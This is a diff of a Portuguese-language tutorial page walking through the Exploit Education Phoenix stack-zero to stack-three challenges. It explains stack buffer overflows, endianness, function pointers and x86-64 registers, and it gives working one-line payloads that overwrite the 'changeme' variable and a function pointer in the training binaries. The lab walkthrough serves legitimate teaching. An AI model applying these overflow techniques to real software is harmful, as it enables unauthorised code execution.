+<p>Pra lembrar bem, desenha uma stack no papel, da um push nas variáveis e no buffer, mostra o sentido que o
+buffer escreve, e ele vazando e mudando o valor das outras variáveis...</p>
+<a class="header" href="print.html#-solução" id="-solução"><h1>👾 Solução</h1></a>
 <pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
 Welcome to phoenix/stack-zero, brought to you 
 by https://exploit.education
 Well done, the 'changeme' variable has been changed!
 </code></pre>
-<h1><a class="header" href="#-objetivo" id="-objetivo">🎯 Objetivo</a></h1>
+<a class="header" href="print.html#-objetivo" id="-objetivo"><h1>🎯 Objetivo</h1></a>
 <p>Agora o objetivo não é só alterar <code>changeme</code>, é alterar para um valor especifico!</p>
 <p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
 <p>Pois é, ele vai ser super util agora!</p>
-<h1><a class="header" href="#-dicas" id="-dicas">💡 Dicas</a></h1>
+<a class="header" href="print.html#-dicas" id="-dicas"><h1>💡 Dicas</h1></a>
 <p>Ver a representação hex de cada letra:</p>
 <blockquote>
 <p>$ man ascii</p>
 </blockquote>
 <p>Dar um Google sobre Endianess.</p>
-<h1><a class="header" href="#-explicação-1" id="-explicação-1">💫 Explicação</a></h1>
+<a class="header" href="print.html#-explicação-1" id="-explicação-1"><h1>💫 Explicação</h1></a>
 <p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
-<p>O que ta acontecendo por tras das cenas é que as letras estão virando a sua representação hex.</p>
+<p>O que ta acontecendo por trás das cenas é que as letras estão virando a sua representação hex.</p>
 <p>Então <code>print(&quot;A&quot;*5)</code> é equivalente à <code>print(b&quot;\x41&quot;*5)</code></p>
 <blockquote>
 <p>Presta atenção no b&quot;&quot; : esse b indica que são Bytes! :D</p>
 </blockquote>
 <p>As vezes o python3 vai reclamar de você usar valores arbitrários pra esses bytes,
-então você pode usar o python2 (o print não tem parenteses, mas o resto é igual):</p>
+então você pode usar o python2 (o print não tem parênteses, mas o resto é igual):</p>
 <blockquote>
 <p>$ python -c &quot;print 'blablabla'&quot;</p>
 </blockquote>
 <p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
 <pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
     puts(&quot;Well done, you have successfully set changeme 
-				to the correct value&quot;);
+                to the correct value&quot;);
 </code></pre>
 <p>O buffer tem tamanho 64 de novo, então podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
-<h2><a class="header" href="#input" id="input">Input</a></h2>
+<a class="header" href="print.html#input" id="input"><h2>Input</h2></a>
 <p>Nesse caso, o programa não ta usando o gets pra abrir um input.</p>
 <p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
 você executa no terminal)</p>
 <blockquote>
 <p>./stack-one teste batata</p>
 </blockquote>
-<pre><code>agrv[0] = stack-one (o nome do programa)
+<pre><code>argv[0] = stack-one (o nome do programa)
 argv[1] = teste
 argv[2] = batata
 ... e assim por diante
@@ -475,16 +387,16 @@ argv[2] = batata
 <blockquote>
 <p>argc é a contagem: quantas coisas tem no argv! E aqui tá checando se é menor que 2!</p>
 </blockquote>
-<p>então no nosso caso, para mandar o input do python para o agrv vai funcionar assim:</p>
+<p>então no nosso caso, para mandar o input do python para o argv vai funcionar assim:</p>
 <blockquote>
 <p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
-o <code>$()</code> executa o comando dentro dos parenteses e usa o valor retornado como input do outro!</p>
+o <code>$()</code> executa o comando dentro dos parênteses e usa o valor retornado como input do outro!</p>
 </blockquote>
 <p>então <code>$(python....)</code> vai executar, e em seguida:</p>
 <blockquote>
 <p>./stack-one AAAAAAAAAAAAAA...</p>
 </blockquote>
-<h2><a class="header" href="#endian" id="endian">Endian</a></h2>
+<a class="header" href="print.html#endian" id="endian"><h2>Endian</h2></a>
 <p>O valor de changeme tem tamanho 4 bytes, pq ele é um integer (integers são 32 ou 64 bits, então 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
 <pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
 Welcome to phoenix/stack-one, brought to you by exploit.education
@@ -493,12 +405,12 @@ Getting closer! changeme is currently 0x45444342, we want 0x496c5962
 <p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
 <p>Ue, que esquisito, vc reparou algo de estranho?</p>
 <p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
-<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os numeros são representados.</p>
+<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os números são representados.</p>
 <blockquote>
-<p>Esses sistemas se referem a magnitude dos digitos, Centena, Dezena, Unidade,...</p>
+<p>Esses sistemas se referem a magnitude dos dígitos, Centena, Dezena, Unidade,...</p>
 </blockquote>
 <blockquote>
-<p>Em um sistema BE, os numeros são representados em ordem descrescente CDU.</p>
+<p>Em um sistema BE, os numeros são representados em ordem decrescente CDU.</p>
 </blockquote>
 <blockquote>
 <p>Em um sistema LE, os numeros são representados em ordem crescente UDC.</p>
@@ -516,8 +428,8 @@ Getting closer! changeme is currently 0x42434445, we want 0x496c5962
 <p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
 o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
 <p>Mas eu não sei que letras são equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
-<h3><a class="header" href="#-dica-usando-valores-hex-diretamente" id="-dica-usando-valores-hex-diretamente">🌙 Dica: Usando valores hex diretamente</a></h3>
-<p>Lembra que eu falei que letras são valores hex? A gente tambem pode usar os valores hex diretamente usando \x  :D</p>
+<a class="header" href="print.html#-dica-usando-valores-hex-diretamente" id="-dica-usando-valores-hex-diretamente"><h3>🌙 Dica: Usando valores hex diretamente</h3></a>
+<p>Lembra que eu falei que letras são valores hex? A gente também pode usar os valores hex diretamente usando \x  :D</p>
 <blockquote>
 <p>Então usar b&quot;\x41&quot; é igual a b&quot;A&quot;!</p>
 </blockquote>
@@ -525,8 +437,8 @@ o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)
 Welcome to phoenix/stack-one, brought to you by exploit.education
 Well done, you have successfully set changeme to the correct value
 </code></pre>
-<p>Yay vitoria! </p>
-<p>Caso você queira usar as letras, voce pode tambem!</p>
+<p>Yay vitoria!</p>
+<p>Caso você queira usar as letras, voce pode também!</p>
 <p>Então <code>b'\x62\x59\x6c\x49'</code> é equivalente a <code>b'bYlI'</code></p>
 <pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
 Welcome to phoenix/stack-one, brought to you by exploit.education
@@ -534,19 +446,19 @@ Well done, you have successfully set changeme to the correct value
 </code></pre>
 <p>Mas e nos casos que o byte não tem um correspondente válido? Vc usa <code>&quot;\x&quot;</code> :D</p>
 <p>Na verdade, é mais prático usar <code>\x</code> 99% das vezes, então vale a pena criar o habito!</p>
-<h1><a class="header" href="#-solução-1" id="-solução-1">🔥 Solução</a></h1>
+<a class="header" href="print.html#-solução-1" id="-solução-1"><h1>🔥 Solução</h1></a>
 <blockquote>
 <p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
 </blockquote>
-<h1><a class="header" href="#-objetivo-1" id="-objetivo-1">🎯 Objetivo</a></h1>
-<p>Similar à anterior, a gente precisa mudar o valor da variavel changeme,
-mas dessa vez ao inves de usar o input ou agrv, vamos usar env!</p>
-<h1><a class="header" href="#-explicação-2" id="-explicação-2">💫 Explicação</a></h1>
+<a class="header" href="print.html#-objetivo-1" id="-objetivo-1"><h1>🎯 Objetivo</h1></a>
+<p>Similar à anterior, a gente precisa mudar o valor da variável changeme,
+mas dessa vez ao invés de usar o input ou argv, vamos usar env!</p>
+<a class="header" href="print.html#-explicação-2" id="-explicação-2"><h1>💫 Explicação</h1></a>
 <p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
-enviroment variable. </p>
-<h2><a class="header" href="#-environment-variable-variável-do-ambiente" id="-environment-variable-variável-do-ambiente">🌳 Environment Variable (Variável do ambiente)</a></h2>
-<p>Essas variaveis são acessiveis para todos os programas
-executando naquela seção. E normalmente contem preferencias como cores, o tipo de terminal, etcetc....</p>
+environment variable.</p>
+<a class="header" href="print.html#-environment-variable-variável-do-ambiente" id="-environment-variable-variável-do-ambiente"><h2>🌳 Environment Variable (Variável do ambiente)</h2></a>
+<p>Essas variáveis são acessíveis para todos os programas
+executando naquela seção. E normalmente contem preferências como cores, o tipo de terminal, etcetc....</p>
 <p>Você pode checa-las usando</p>
 <blockquote>
 <p>$ env</p>
@@ -559,9 +471,9 @@ executando naquela seção. E normalmente contem preferencias como cores, o tipo
 <blockquote>
 <p>$ Nome=Valor ./stack-two</p>
 </blockquote>
-<p>Para nós, não faz tanta diferença se o input é pelas <code>envs</code> ou por outro metodo.</p>
-<p>O unico problema é que não podemos usar o Null Byte (0x00), pois ele é usado para indicar o final de uma string ASCII, portanto terminando nossa variavel precocemente.</p>
-<h2><a class="header" href="#overflow" id="overflow">Overflow</a></h2>
+<p>Para nós, não faz tanta diferença se o input é pelas <code>envs</code> ou por outro método.</p>
+<p>O único problema é que não podemos usar o Null Byte (0x00), pois ele é usado para indicar o final de uma string ASCII, portanto terminando nossa variável precocemente.</p>
+<a class="header" href="print.html#overflow" id="overflow"><h2>Overflow</h2></a>
 <p>Em seguida, o valor é copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
 <p>A função <code>strcpy</code>, assim como <code>gets</code>, não checa se o valor é maior que o buffer, tornando o programa vulnerável... :(</p>
 <p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
@@ -588,67 +500,67 @@ executando naquela seção. E normalmente contem preferencias como cores, o tipo
 </code></pre>
 <p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
 <blockquote>
-<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two </p>
+<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
 </blockquote>
 <pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
 Well done, you have successfully set changeme to the correct value
 </code></pre>
 <p>Uhuuu, esse foi mais fácil :D</p>
-<h1><a class="header" href="#-solução-2" id="-solução-2">🔥 Solução</a></h1>
+<a class="header" href="print.html#-solução-2" id="-solução-2"><h1>🔥 Solução</h1></a>
 <blockquote>
 <p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
 </blockquote>
-<h1><a class="header" href="#-objetivo-2" id="-objetivo-2">🎯 Objetivo</a></h1>
+<a class="header" href="print.html#-objetivo-2" id="-objetivo-2"><h1>🎯 Objetivo</h1></a>
 <p>Usar um pointer para retornar para uma função pre existente</p>
-<h1><a class="header" href="#-dica-1" id="-dica-1">💡 Dica</a></h1>
+<a class="header" href="print.html#-dica-1" id="-dica-1"><h1>💡 Dica</h1></a>
 <p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
-<h1><a class="header" href="#-explicação-3" id="-explicação-3">💫 Explicação</a></h1>
+<a class="header" href="print.html#-explicação-3" id="-explicação-3"><h1>💫 Explicação</h1></a>
 <ul>
 <li>O que raios são pointers</li>
 <li>Function pointers</li>
 <li>Exploit</li>
 </ul>
-<h3><a class="header" href="#-o-que-raios-são-pointers" id="-o-que-raios-são-pointers">↗️↘️ O que raios são pointers</a></h3>
+<a class="header" href="print.html#-o-que-raios-são-pointers" id="-o-que-raios-são-pointers"><h3>↗️↘️ O que raios são pointers</h3></a>
 <blockquote>
 <p>Pointers são uma estrutura que, ao invés de armazenar dados, armazena o endereço de outra estrutura.
 Lembra do exemplo do poço? Que cada item tinha seu endereço na stack! Então, um pointer armazena esse endereço! :D</p>
 </blockquote>
 <p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade está em Y direção.</p>
-<p>Colunas: Nome da Variavel | Endereço | conteúdo</p>
-<p><img src="stack/phoenix/./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
-<p>A variável &quot;a&quot; é um pointer que armazena a localização da variavel &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; está apontando para &quot;b&quot; (seta vermelha).</p>
+<p>Colunas: Nome da Variável | Endereço | conteúdo</p>
+<p><img src="./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
+<p>A variável &quot;a&quot; é um pointer que armazena a localização da variável &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; está apontando para &quot;b&quot; (seta vermelha).</p>
 <blockquote>
 <p>&quot;a&quot; armazena uma referencia á &quot;b&quot; !</p>
 </blockquote>
 <blockquote>
 <p>&quot;a&quot; pode ser des-referenciada, isto é: Seguir a direção que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
 </blockquote>
-<p>Normalmente, o caractere &quot;&amp;&quot; indica uma referência, e o caractere &quot;*&quot; desreferencia aquele pointer.</p>
+<p>Normalmente, o caracteres &quot;&amp;&quot; indica uma referência, e o caracteres &quot;*&quot; desreferencia aquele pointer.</p>
 <blockquote>
 <p>Caso você tente desrefenciar um pointer que não aponta pra nada (NULL),
 o programa vai interromper a execução e soltar uma mensagem de erro!
-Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, você vai ver &quot;Null Checks&quot; 
+Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, você vai ver &quot;Null Checks&quot;
 bem frequentemente nesses desafios e em programas em geral!</p>
 </blockquote>
-<h3><a class="header" href="#-function-pointers" id="-function-pointers">🦀 Function Pointers</a></h3>
+<a class="header" href="print.html#-function-pointers" id="-function-pointers"><h3>🦀 Function Pointers</h3></a>
 <blockquote>
-<p>Function pointers, ao envés de armazenar o endereço de uma variável, armazenam o endereço de uma função! :D</p>
+<p>Function pointers, ao invés de armazenar o endereço de uma variável, armazenam o endereço de uma função! :D</p>
 </blockquote>
-<p>Sim! Funções também são armazenadas na Stack, e possuem seu endereço! Esse endereço pode ser encontrado por varios métodos:</p>
+<p>Sim! Funções também são armazenadas na Stack, e possuem seu endereço! Esse endereço pode ser encontrado por vários métodos:</p>
 <pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_função&gt;
 
 
 gdb &lt;programa&gt;
   (gdb)&gt; info functions
 </code></pre>
-<p>Os dois metodos serão demonstrados em breve! :D</p>
-<h3><a class="header" href="#-exploit" id="-exploit">🔥 Exploit</a></h3>
+<p>Os dois métodos serão demonstrados em breve! :D</p>
+<a class="header" href="print.html#-exploit" id="-exploit"><h3>🔥 Exploit</h3></a>
 <blockquote>
-<p>Buffer overflow, alterarando o valor de um function pointer, redirecionando a execução do programa.</p>
+<p>Buffer overflow, alterando o valor de um function pointer, redirecionando a execução do programa.</p>
 <p>Em lingua não nerd, por favor? :P</p>
 <p>O valor que sera corrompido pelo buffer overflow indica aonde a execução do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
 </blockquote>
-<h4><a class="header" href="#-analisando-o-programa" id="-analisando-o-programa">🛸 Analisando o programa</a></h4>
+<a class="header" href="print.html#-analisando-o-programa" id="-analisando-o-programa"><h4>🛸 Analisando o programa</h4></a>
 <pre><code class="language-C">função complete_level() {   // a função que a gente quer chamar
 .......
 }
@@ -674,9 +586,9 @@ função main() {
 </code></pre>
 <p>Nós queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endereço.</p>
 <p>E nós já sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! Então tá na hora do trabalho!</p>
-<h4><a class="header" href="#-encontrando-o-endereço-da-função" id="-encontrando-o-endereço-da-função">🏠 Encontrando o endereço da função</a></h4>
+<a class="header" href="print.html#-encontrando-o-endereço-da-função" id="-encontrando-o-endereço-da-função"><h4>🏠 Encontrando o endereço da função</h4></a>
 <pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endereços
-                  ( O -d é pra ativar a disassembly: Converter de machine code para algo legivel )!
+                  ( O -d é pra ativar a disassembly: Converter de machine code para algo legível )!
 gdb
 </code></pre>
 <p>objdump</p>
@@ -711,15 +623,15 @@ Non-debugging symbols:
 <blockquote>
 <p>O endereço da função é 0x000000000040069d ! :D</p>
 </blockquote>
-<p>Presta atenção na quantidade de null bytes que precedem o endereço. Todo pointer começa com pelo menos dois null bytes, 
+<p>Presta atenção na quantidade de null bytes que precedem o endereço. Todo pointer começa com pelo menos dois null bytes,
 e strings terminam com 1 null byte!</p>
-<p>Assim, impedindo atacantes (nós), de definir um pointer novo, pois quebraria a string do nosso 
+<p>Assim, impedindo atacantes (nós), de definir um pointer novo, pois quebraria a string do nosso
 input. Nós precisamos usar um que já esta na memoria! (  Spoiler hehehehe :D  )</p>
 <p>Como nesse desafio o pointer ja existe (<code>fp</code>) e nós só vamos mudar os bytes finais dele
-(Inteiro escreve na direção LE, lembra? Então não vai inteferir com os NULLs que vem antes)</p>
+(Inteiro escreve na direção LE, lembra? Então não vai interferir com os NULLs que vem antes)</p>
 <p>Portanto não precisamos nos preocupar com isso nesse desafio!</p>
-<h4><a class="header" href="#-cansei-de-teoria-eu-quero-exploit" id="-cansei-de-teoria-eu-quero-exploit">😐 Cansei de teoria eu quero exploit</a></h4>
-<p>Se você quer tentar por conta propria, agora é sua hora de brilhar!</p>
+<a class="header" href="print.html#-cansei-de-teoria-eu-quero-exploit" id="-cansei-de-teoria-eu-quero-exploit"><h4>😐 Cansei de teoria eu quero exploit</h4></a>
+<p>Se você quer tentar por conta própria, agora é sua hora de brilhar!</p>
 <pre><code>Lembretes:
 Little Endian, o buffer tem 64 bytes,
 b&quot;\x&quot;, e o input vem pelo gets()
@@ -754,39 +666,39 @@ b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
 Congratulations, you've finished phoenix/stack-three :-) Well done!
 </code></pre>
 <p>Espero que você tenha gostado! :D</p>
-<h1><a class="header" href="#-solução-3" id="-solução-3">🔥 Solução</a></h1>
+<a class="header" href="print.html#-solução-3" id="-solução-3"><h1>🔥 Solução</h1></a>
 <blockquote>
-<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three </p>
+<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three</p>
 </blockquote>
 <pre><code>calling function pointer @ 0x40069d
 Congratulations, you've finished phoenix/stack-three :-) Well done!
 </code></pre>
-<h1><a class="header" href="#-objetivo-3" id="-objetivo-3">🎯 Objetivo</a></h1>
+<a class="header" href="print.html#-objetivo-3" id="-objetivo-3"><h1>🎯 Objetivo</h1></a>
 <p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execução do programa.</p>
 <p>Esse desafio está nos preparando para o próximo, no qual nos redirecionaremos a execução para o nosso próprio código, e teremos um exploit de verdade! :D</p>
-<p>Esse tipo de exploit era viável nos anos 90, quando mecanismos de proteção não existiam. Por isso é chamado de buffer overflow clássico (ou <code>SRP BOF</code>, 
+<p>Esse tipo de exploit era viável nos anos 90, quando mecanismos de proteção não existiam. Por isso é chamado de buffer overflow clássico (ou <code>SRP BOF</code>,
 caso você goste de siglas)! :D</p>
 <p>Se você souber inglês, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
-<h1><a class="header" href="#-conhecimento-preliminar" id="-conhecimento-preliminar">🛸 Conhecimento preliminar</a></h1>
+<a class="header" href="print.html#-conhecimento-preliminar" id="-conhecimento-preliminar"><h1>🛸 Conhecimento preliminar</h1></a>
 <p>Se tem uma seção inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de segurança está firme e travado,
 mantenha as mãos, pernas e canecas de café dentro do veículo durante todo o percurso!</p>
 <p>3...2...1....</p>
-<h2><a class="header" href="#-assembly" id="-assembly">🤖 Assembly</a></h2>
+<a class="header" href="print.html#-assembly" id="-assembly"><h2>🤖 Assembly</h2></a>
 <p>Recursos adicionais: <br />
 <a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
 <a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
 <a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
 <a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
-<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registradores - Introdução Engenharia Reversa</a> </p>
+<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - Introdução Engenharia Reversa</a> \</p>
 <p>Eu pretendo fazer uma serie de tutorias dedicada à assembly (ASM), porém isso é para o futuro...</p>
-<p>Eu vou usar sintaxe intel, pq é a melhor e se alguem te disser o contrário, a pessoa ta mentindo &gt;:( !!!!</p>
+<p>Eu vou usar sintaxe intel, pq é a melhor e se alguém te disser o contrário, a pessoa ta mentindo &gt;:( !!!!</p>
 <blockquote>
-<p>ASM é uma representação legivel dos 0s e 1s das instruções do computador.
+<p>ASM é uma representação legível dos 0s e 1s das instruções do computador.
 Ela pode ser transformada em machine code (código de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
 </blockquote>
-<p>Então como você pode imaginar, é bem complicado, e a minha maneira de explicar pode não funcionar para você... Então vai com calma, le de outras fontes, assite 
+<p>Então como você pode imaginar, é bem complicado, e a minha maneira de explicar pode não funcionar para você... Então vai com calma, le de outras fontes, assiste
 videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
-<h3><a class="header" href="#-register-registros--registradores" id="-register-registros--registradores">📦 Register (Registros / Registradores)</a></h3>
+<a class="header" href="print.html#-register-registos--registadores" id="-register-registos--registadores"><h3>📦 Register (Registos / Registadores)</h3></a>
 <blockquote>
 <p>Registers são pedaços de memória que ficam dentro do chip do processador,
 semelhante a memória RAM, porém extremamente rápidos e pequenos.</p>
@@ -795,8 +707,8 @@ semelhante a memória RAM, porém extremamente rápidos e pequenos.</p>
 4 bytes, 64 bits = register de 8 bytes)</p>
 <p>Esses registers são semelhantes à variáveis, no sentido que
 armazenam valores, podem ser alterados e lidos.</p>
-<h4><a class="header" href="#-general-purpose-registers-gpr--registro-de-propósito-geral-" id="-general-purpose-registers-gpr--registro-de-propósito-geral-">🌍 General Purpose Registers (GPR) ( Registro de Propósito Geral )</a></h4>
-<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). </p>
+<a class="header" href="print.html#-general-purpose-registers-gpr--registo-de-propósito-geral-" id="-general-purpose-registers-gpr--registo-de-propósito-geral-"><h4>🌍 General Purpose Registers (GPR) ( Registo de Propósito Geral )</h4></a>
+<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo).</p>
 <blockquote>
 <p>Por exemplo: AX (16 bits, endereços: 0 a 15) (uma versão antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
 </blockquote>
@@ -809,48 +721,48 @@ R8 a 15          -&gt; você só precisa saber que eles existem
 </code></pre>
 <p>Alem disso, são usados para passar os argumentos para funções (explicação em breve)</p>
 <pre><code class="language-x86asm">RAX (Valor retornado)
-RDI (1º parametro)
-RSI (2º parametro)
-RDX (3º parametro)
+RDI (1º parâmetro)
+RSI (2º parâmetro)
+RDX (3º parâmetro)
 ...
 </code></pre>
-<p>Para os nossos proprositos, é mais vantajoso considerar que eles só servem para 
+<p>Para os nossos propósitos, é mais vantajoso considerar que eles só servem para
 armazenar valores e passar argumentos</p>
-<h4><a class="header" href="#-address-register--armazenam-endereços-da-stack-" id="-address-register--armazenam-endereços-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></h4>
+<a class="header" href="print.html#-address-register--armazenam-endereços-da-stack-" id="-address-register--armazenam-endereços-da-stack-"><h4>💫 Address Register ( armazenam endereços da stack )</h4></a>
 <pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
 RBP Base Pointer        -&gt; Aponta para a base da stack
 RIP Instruction Pointer -&gt; Aponta para a instrução 
-								que está sendo executada 
+                                que está sendo executada 
 </code></pre>
-<h4><a class="header" href="#-rflag" id="-rflag">🏁 RFLAG</a></h4>
+<a class="header" href="print.html#-rflag" id="-rflag"><h4>🏁 RFLAG</h4></a>
 <p>O register RFLAG armazena flags: sinais que indicam resultados de operações passadas.
 Esses sinais são 1 bit (0 ou 1)</p>
 <pre><code>Exemplos:
 
 Posição    Nome         Descrição 
 0          Carry         Resultado estourou o limite de um inteiro
-								sem sinal (o &quot;vai-um&quot; da matemática)
+                                sem sinal (o &quot;vai-um&quot; da matemática)
 6          Zero          A operação resultou em 0
 11         Overflow      Estourou o limite de um inteiro com sinal
 </code></pre>
-<h4><a class="header" href="#-apêndice---curiosidade--nomenclatura-histórica" id="-apêndice---curiosidade--nomenclatura-histórica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></h4>
-<p><img src="stack/phoenix/./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
+<a class="header" href="print.html#-apêndice---curiosidade--nomenclatura-histórica" id="-apêndice---curiosidade--nomenclatura-histórica"><h4>🧠 Apêndice - Curiosidade : Nomenclatura histórica</h4></a>
+<p><img src="./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
 Eu vou usar o RAX como exemplo!</p>
 <pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
-Em computadores 16 bits, ele era chamdo AX (Acumulador eXtendido ) 
+Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
 Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
 Em computadores 64 bits, ele é chamado RAX e tem o tamanho de 2 EAX
 
-Para propositos de retro-compatibilidade, nos ainda podemos usar, 
+Para propósitos de retro-compatibilidade, nos ainda podemos usar, 
 por exemplo, EAX em um computador 64 bits !
-Por tras das cenas, o computador interpreta EAX como a segunda metade do RAX
+Por trás das cenas, o computador interpreta EAX como a segunda metade do RAX
 
-Então não estranhe caso alguem fale de EIP numa
+Então não estranhe caso alguém fale de EIP numa
 arquitetura x64, pois na linguagem informal não faz diferença
 
 Mas caso você vá analisar o register em um debugger, a diferença importa :D
 </code></pre>
-<h3><a class="header" href="#-instruções" id="-instruções">⚡ Instruções</a></h3>
+<a class="header" href="print.html#-instruções" id="-instruções"><h3>⚡ Instruções</h3></a>
 <blockquote>
 <p>Obs: os registers foram usados aleatoriamente, pois seu propósito na realidade não é relevante para a explicação !</p>
 </blockquote>
@@ -859,7 +771,7 @@ Mas caso você vá analisar o register em um debugger, a diferença importa :D
 </code></pre>
 <p>Na sintaxe intel, o &quot;alvo&quot; da operação vem primeiro e o &quot;parâmetro&quot; depois</p>
 <p>Caso os dois argumentos da instrução sejam valores, a operação executara normalmente</p>
-<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operação será salvo nele </p>
+<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operação será salvo nele</p>
 <pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
 add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
 add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
@@ -893,19 +805,19 @@ xor, and, ......  -&gt; Operadores lógicos, têm o mesmo comportamento de sub e
 
 Jumps/Pulos
 jmp 0x00001234 -&gt; Move o RIP para aquela localização incondicionalmente,
-			equivalente a um GOTO
+            equivalente a um GOTO
 
 test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
              |---&gt; Compara os valores; Se forem iguais da o jump
-			 (normalmente usado em conjunto com a ZERO_FLAG)
+             (normalmente usado em conjunto com a ZERO_FLAG)
 
 jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ≤
 jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ≥
 </code></pre>
 <p>Caso vc não saiba os operadores lógicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador Lógico</a></p>
-<h3><a class="header" href="#-funções-prólogo-e-epílogo" id="-funções-prólogo-e-epílogo">🦄 Funções, Prólogo e Epílogo</a></h3>
+<a class="header" href="print.html#-funções-prólogo-e-epílogo" id="-funções-prólogo-e-epílogo"><h3>🦄 Funções, Prólogo e Epílogo</h3></a>
 <p>Agora tá na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, então é bom dar uma revisada, né?</p>
